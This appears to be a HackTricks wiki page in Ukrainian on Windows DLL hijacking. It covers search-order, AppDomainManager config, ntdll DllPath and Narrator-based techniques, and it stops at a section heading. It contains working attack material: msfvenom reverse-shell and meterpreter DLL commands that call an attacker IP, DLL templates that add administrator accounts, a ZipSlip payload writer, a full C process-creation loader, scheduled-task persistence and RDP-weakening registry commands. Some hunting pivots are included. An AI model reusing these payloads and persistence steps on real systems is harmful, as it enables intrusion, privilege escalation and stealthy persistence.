# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking передбачає маніпулювання довіреною application, щоб змусити її завантажити malicious DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection та Side-Loading**. Переважно він використовується для виконання code, забезпечення persistence і, рідше, privilege escalation. Попри зосередженість цього розділу на escalation, метод hijacking залишається незмінним незалежно від мети.

### Поширені техніки

Для DLL hijacking застосовують кілька методів, ефективність кожного з яких залежить від стратегії application щодо завантаження DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: заміна справжньої DLL на malicious DLL, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: розміщення malicious DLL у шляху пошуку перед легітимною DLL з використанням шаблону пошуку application.
3. **Phantom DLL Hijacking**: створення malicious DLL, яку application завантажить, вважаючи її необхідною DLL, що не існує.
4. **DLL Redirection**: зміна параметрів пошуку, таких як `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати application до malicious DLL.
5. **WinSxS DLL Replacement**: заміна легітимної DLL на malicious counterpart у каталозі WinSxS — метод, який часто пов’язують із DLL side-loading.
6. **Relative Path DLL Hijacking**: розміщення malicious DLL у контрольованому користувачем каталозі разом із скопійованою application, що нагадує техніки Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити attacker code. Якщо цільовий executable є **managed** application, CLR також перевіряє application configuration file з назвою, що відповідає executable (наприклад, `Setup.exe.config`). Цей файл може визначати custom **AppDomainManager**. Якщо config вказує на attacker-controlled assembly, розміщену поруч з EXE, CLR завантажує її **до звичайного code path application** і запускає всередині довіреного процесу.<sup>[[24]](#references)</sup>

Відповідно до схеми конфігурації .NET Framework від Microsoft, для використання custom manager мають бути присутні обидва елементи — `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Мінімальний менеджер:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Практичні примітки:
- Це tradecraft, специфічний для **.NET Framework**. Він залежить від парсингу конфігурації CLR, а не від порядку пошуку DLL у Win32.
- Хост справді має бути **managed EXE**. Швидкий triage: `sigcheck -m target.exe`, `corflags target.exe` або перевірка наявності **CLR Runtime Header** у метаданих PE.
- Ім'я конфігураційного файлу має точно відповідати імені виконуваного файлу (`<binary>.config`) і зазвичай він розташований **поруч із EXE**.
- Це корисно із **підписаними бінарними файлами Microsoft/vendor**, оскільки trusted EXE залишається незмінним, тоді як malicious managed assembly виконується in-process.
- Якщо у вас уже є writable installer/update directory, hijacking AppDomainManager можна використати як **first stage**, а потім застосувати classic DLL sideloading або reflective loading для наступних етапів.

### AppDomainManager як downloader + bootstrap для scheduled task

Практичний intrusion pattern полягає в поєднанні trusted managed EXE із malicious `*.config` та malicious AppDomainManager DLL, яка виконує роль лише **невеликого bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний .NET installer або updater із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Сусідній config змушує CLR завантажити attacker assembly **до** початку логіки legitimate app.
3. Malicious manager виконує **path gate** (наприклад, продовжує роботу лише якщо host EXE запущений із `Downloads`, а second stage запускається лише з `%LOCALAPPDATA%`).
4. Якщо перевірка проходить, він завантажує реальний payload у user-writable path, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і встановлює persistence за допомогою scheduled task.

Чому цей варіант важливий:
- Підписаний host EXE залишається незміненим, тому triage, під час якого перевіряються лише хеші основного бінарного файлу, може не виявити compromise.
- Простий **path-based anti-analysis** є поширеним: переміщення ZIP/EXE/DLL triad на Desktop, Temp або шлях sandbox може навмисно перервати chain.
- First-stage AppDomainManager DLL може залишатися малою та low-noise, тоді як реальний implant завантажується пізніше.

Мінімальний приклад persistence, який часто зустрічається в цьому pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Нотатки:
- ` /rl highest` означає **найвищий доступний** рівень для цього користувача/сеансу; сам по собі він не гарантує ескалацію до SYSTEM.
- Цю техніку часто правильніше класифікувати як **execution/persistence via .NET config abuse**, а не як класичний missing-DLL search-order hijacking, хоча оператори часто поєднують обидва підходи.

Поворотні точки для виявлення:
- Підписані .NET-виконувані файли, запущені з шляхів розпакування **ZIP**, `Downloads`, `%TEMP%` або інших доступних для запису користувачу каталогів, поруч із якими міститься `<exe>.config`.
- Нові заплановані завдання, дії яких вказують на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а їхні назви імітують оновлювачі браузерів/постачальників.
- Короткоживучі керовані bootstrap-процеси, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу на ранньому етапі, якщо шлях до виконуваного файлу не відповідає очікуваному каталогу профілю користувача.

### Hijacking наявного запланованого завдання для повторного запуску sideload chain

Для persistence не обмежуйтеся пошуком **створення нового завдання**. Деякі набори вторгнення очікують, поки легітимний інсталятор створить **звичайне завдання оновлювача**, а потім **переписують дію завдання**, щоб наявні назва, автор і тригер залишалися знайомими для захисників.

Багаторазово використовуваний workflow:
1. Установіть/запустіть легітимне програмне забезпечення та визначте завдання, яке воно зазвичай створює.
2. Експортуйте XML завдання та зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб завдання запускало ваш **trusted host EXE** із доступного для запису користувачу staging-каталогу, після чого він виконає sideload або AppDomain-load реального payload.
4. Повторно зареєструйте завдання з тією самою назвою замість створення нового очевидного persistence-артефакту.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Чому це stealthier:
- Назва task все ще може виглядати легітимною, наприклад як updater від vendor.
- **Task Scheduler service** запускає її, тому перевірка parent/ancestor часто бачить очікуваний ланцюжок планування замість `explorer.exe`.
- DFIR-команди, які шукають лише **нові назви task**, можуть пропустити task, реєстрація якого вже існувала, але action тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший path, контрольований attacker.

Швидкі hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли `C:\Windows\System32\Tasks\*` і metadata з `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з baseline.
- Створюйте alert, коли **updater task, що виглядає як vendor task**, запускається з **user-writable directories** або запускає .NET EXE із розташованим поруч файлом `*.config`.

> [!TIP]
> Покроковий ланцюжок, що поєднує HTML staging, AES-CTR configs і .NET implants із DLL sideloading, описано в workflow нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals, **налаштувавши** **такі 2 filters**:

![Common Techniques - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із sysinternals, налаштувавши такі 2 filters](<../../../images/image (961).png>)

![Common Techniques - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із sysinternals, налаштувавши такі 2 filters](<../../../images/image (230).png>)

і показати лише **File System Activity**:

![Common Techniques - Пошук відсутніх DLL: і показати лише File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dll загалом**, **залиште** це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у конкретному executable**, додайте ще один filter, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його та припиніть захоплення events.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх DLL

Для підвищення привілеїв шукайте **DLL, яку privileged process намагається завантажити** з location, доступної для запису. Це може статися, коли ви контролюєте directory, яка перевіряється раніше за directory із легітимною DLL, або коли запитувана DLL не існує, а ви можете записати в одну з перевірюваних directories.

### Порядок пошуку DLL

**У** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти інформацію про те, як саме завантажуються DLL.**

**Windows applications** шукають DLL, використовуючи набір **pre-defined search paths**, дотримуючись певної послідовності. Проблема DLL hijacking виникає, коли шкідливу DLL стратегічно розміщено в одній із цих directories, завдяки чому вона завантажується раніше за справжню DLL. Щоб запобігти цьому, application має використовувати absolute paths під час звернення до необхідних DLL.

Нижче наведено **порядок пошуку DLL у 32-bit** системах:

1. Directory, з якої application було завантажено.
2. System directory. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати path до цієї directory.(_C:\Windows\System32_)
3. 16-bit system directory. Не існує функції, яка отримує path до цієї directory, але вона перевіряється. (_C:\Windows\System_)
4. Windows directory. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати path до цієї directory.
1. (_C:\Windows_)
5. Current directory.
6. Directories, перелічені в environment variable PATH. Зверніть увагу, що сюди не входить per-application path, визначений registry key **App Paths**. Key **App Paths** не використовується під час обчислення DLL search path.

Це **default** search order із увімкненим **SafeDllSearchMode**. Коли його вимкнено, current directory переміщується на друге місце. Щоб вимкнути цю функцію, створіть registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть її в 0 (за замовчуванням функцію увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в directory executable module, який завантажує **LoadLibraryEx**.

Зрештою, DLL можна завантажити за absolute path, а не за name. У такому разі Windows шукає саму DLL лише за цим path; dependencies, запитані за name, усе ще використовують відповідний search order.

Існують інші способи змінити search order, але я не пояснюватиму їх тут.

### Поєднання arbitrary file write з missing-DLL hijack

1. Використовуйте filters **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які process перевіряє, але не може знайти.<sup>[[14]](#references)</sup>
2. Якщо binary запускається за **schedule/service**, DLL з однією з цих назв, розміщена в **application directory** (search-order entry #1), буде завантажена під час наступного запуску. В одному випадку з .NET scanner process шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL, наприклад reverse shell, з будь-яким export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваша primitive — це **ZipSlip-style arbitrary write**, створіть ZIP, entry якого виходить за межі extraction dir, щоб DLL опинилася в app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів до контрольованої inbox/share; коли scheduled task повторно запустить процес, він завантажить malicious DLL і виконає ваш код від імені service account.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Розширеним способом детерміновано вплинути на шлях пошуку DLL новоствореного процесу є встановлення поля DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою native APIs ntdll. Якщо вказати тут контрольований атакувальником каталог, цільовий процес, який визначає імпортовану DLL за іменем (без абсолютного шляху та без використання safe loading flags), можна змусити завантажити malicious DLL із цього каталогу.

Ключова ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть custom DllPath, що веде до вашої контрольованої папки (наприклад, каталогу, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий binary визначатиме DLL за іменем, loader звернеться до вказаного DllPath під час resolution, забезпечуючи надійне sideloading, навіть якщо malicious DLL не розташована поруч із цільовим EXE.

Примітки/обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Цільовий процес має імпортувати DLL або викликати LoadLibrary для DLL за іменем (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо hijack-нути. Forwarded exports і SxS можуть змінити пріоритет.

Мінімальний приклад C (ntdll, wide strings, спрощене оброблення помилок):

<details>
<summary>Повний приклад C: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад практичного використання
- Розмістіть malicious xmllite.dll (з експортом необхідних функцій або проксіюванням до справжньої DLL) у вашому каталозі DllPath.
- Запустіть підписаний binary, який, як відомо, шукає xmllite.dll за ім’ям, використовуючи описану вище техніку. Loader вирішує import через вказаний DllPath і виконує sideloading вашої DLL.

Цю техніку спостерігали у реальних атаках для побудови багатоступеневих sideloading-ланцюжків: початковий launcher розміщує helper DLL, яка потім запускає підписаний Microsoft binary, придатний для hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника з staging-каталогу.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking через `.exe.config`

Для цілей **.NET Framework** sideloading можна виконати **до `Main()`** без patching пам’яті, зловживаючи сусіднім файлом **`.exe.config`** застосунку. Замість того щоб покладатися лише на порядок пошуку Win32 DLL, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим config-файлом і однією чи кількома assemblies, контрольованими зловмисником.

Як працює цей ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE запускається, і **CLR читає `<exe>.config`**.
2. Config задає **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб runtime створив `AppDomainManager`, контрольований зловмисником.
3. Шкідливий manager отримує виконання **до `Main()`** усередині довіреного host process.
4. Той самий config може змусити CLR спочатку шукати локальні assemblies (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і послабити runtime validation/telemetry без inline patching.

Шаблон у стилі campaign (точне вкладення може відрізнятися залежно від directive / версії CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Чому це корисно:
- **`<probing privatePath="."/>`** обмежує пошук assembly каталогом застосунку, перетворюючи цю папку на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** переміщують виконання в код attacker під час ініціалізації CLR, до запуску логіки легітимного застосунку.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити застосунку з повною довірою завантажувати непідписані або змінені assembly без помилки перевірки strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** уникає перенаправлень publisher policy до новіших assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір runtime більш детермінованим.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікавий, оскільки **CLR вимикає власну видимість через ETW** із конфігурації, замість того щоб implant патчив `EtwEventWrite` у пам’яті.

Операційна схема, яку спостерігали в нещодавніх кампаніях:
- Етап 1: скидає `setup.exe`, `setup.exe.config` і локальні assembly.
- Етап 2: копіює їх у правдоподібну папку **AppData update**, перейменовує host на щось на кшталт `update.exe` і повторно запускає його через **scheduled task**.
- Етап 3: перевіряє контекст виконання, наприклад очікуваний батьківський процес `svchost.exe` від Task Scheduler, перш ніж завантажити фінальну RAT DLL/export.

Ідеї для threat hunting:
- Підписані або іншим чином легітимні **.NET executables**, які запускаються із підозрілими сусідніми файлами **`.config`** у доступних для запису користувачем місцях.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Scheduled tasks, які повторно запускають перейменовані update binaries із **`%LOCALAPPDATA%`** або специфічних для застосунку каталогів `\bin\update\`.
- Ланцюжки parent/child, у яких scheduled task запускає trusted .NET host, що одразу завантажує assembly не від vendor із власного каталогу.

#### Винятки з порядку пошуку dll у документації Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Якщо виявлено **DLL, яка має таке саме ім’я, як уже завантажена в пам’ять**, система обходить звичайний пошук. Натомість вона перевіряє перенаправлення та manifest, перш ніж використовувати DLL, яка вже перебуває в пам’яті. **У цьому сценарії система не виконує пошук DLL**.
- Якщо DLL розпізнано як **known DLL** для поточної версії Windows, система використовує свою версію known DLL разом із будь-якими залежними від неї DLL, **пропускаючи процес пошуку**. Розділ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список таких known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише своїми **module names**, незалежно від того, чи була початкова DLL визначена через повний шлях.

### Підвищення привілеїв

**Вимоги**:

- Виявити процес, який працює або працюватиме з **іншими привілеями** (горизонтальне або lateral movement) і якому **бракує DLL**.
- Переконатися, що є **доступ на запис** до будь-якого **каталогу**, у якому виконуватиметься **пошук DLL**. Це може бути каталог виконуваного файла або каталог у системному шляху.

За замовчуванням ці передумови трапляються нечасто: привілейовані виконувані файли зазвичай не мають відсутніх залежностей DLL, а стандартні користувачі зазвичай не можуть записувати до каталогів системного шляху пошуку. Неправильно налаштовані середовища все ж можуть створювати обидві умови.\
Якщо вимоги виконано, перевірте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — UAC bypass, він містить DLL-hijacking PoCs для конкретних версій Windows, які часто можна адаптувати до знайденого каталогу з доступом на запис.

Зверніть увагу, що **перевірити свої дозволи в папці** можна за допомогою:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок усередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Також можна перевірити імпорти виконуваного файлу та експорти DLL за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **зловживати DLL Hijacking для підвищення привілеїв**, маючи дозволи на запис у папку **System Path**, перегляньте:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис у будь-яку папку всередині системного PATH.\
Іншими цікавими автоматизованими інструментами для виявлення цієї вразливості є **функції PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

Якщо ви виявили сценарій, придатний для експлуатації, однією з найважливіших умов успішної експлуатації буде **створення dll, яка експортує щонайменше всі функції, які виконуваний файл імпортуватиме з неї**. У будь-якому разі зверніть увагу, що DLL Hijacking зручно використовувати для [підвищення рівня з Medium Integrity до High **(в обхід UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад **створення коректної dll** можна знайти в цьому дослідженні DLL hijacking, присвяченому DLL hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступно**му розділі наведено **базовий код dll**, який може бути корисним як **шаблон** або для створення **dll з експортованими функціями, які не є обов'язковими**.

## **Створення та компіляція DLL**

### **DLL Proxifying**

По суті, **DLL proxy** — це DLL, здатна **виконати ваш шкідливий код під час завантаження**, а також **надавати** та **працювати** так, як **очікується**, **перенаправляючи всі виклики до справжньої бібліотеки**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна **вказати виконуваний файл і вибрати бібліотеку**, яку потрібно проксіювати, а потім **згенерувати proxified dll**, або **вказати DLL** і **згенерувати proxified dll**.

### **Meterpreter**

**Отримання rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримайте meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створення користувача (x86, версії x64 я не знайшов):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Власний

У багатьох випадках DLL, яку ви компілюєте, повинна **експортувати кожну функцію, імпортовану процесом-жертвою**. Якщо необхідний export відсутній, бінарний файл не може його дозволити, і exploit завершується невдало.

<details>
<summary>Шаблон C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад DLL на C++ зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна DLL на C із точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Практичний приклад: викрадення Localization DLL Narrator OneCore TTS (Accessibility/ATs)

Windows Narrator.exe під час запуску досі перевіряє передбачувану language-specific localization DLL, яку можна hijack-нути для довільного виконання коду та persistence.<sup>[[7]](#references)</sup>

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore існує writable DLL, контрольована attacker-ом, вона завантажується, а `DllMain(DLL_PROCESS_ATTACH)` виконується. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантаження зазначеного вище шляху.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Наївний hijack буде озвучувати/підсвічувати UI. Щоб залишатися непомітним, під час attach перелічіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його через `SuspendThread`; продовжуйте виконання у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Trigger і persistence через конфігурацію Accessibility
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- За допомогою наведених вище налаштувань запуск Narrator завантажує planted DLL. На secure desktop (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.

SYSTEM execution через RDP (lateral movement)
- Дозвольте класичний security layer RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до host через RDP, на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.
- Виконання припиняється після закриття RDP-сесії — виконайте inject/migrate якомога швидше.

Bring Your Own Accessibility (BYOA)
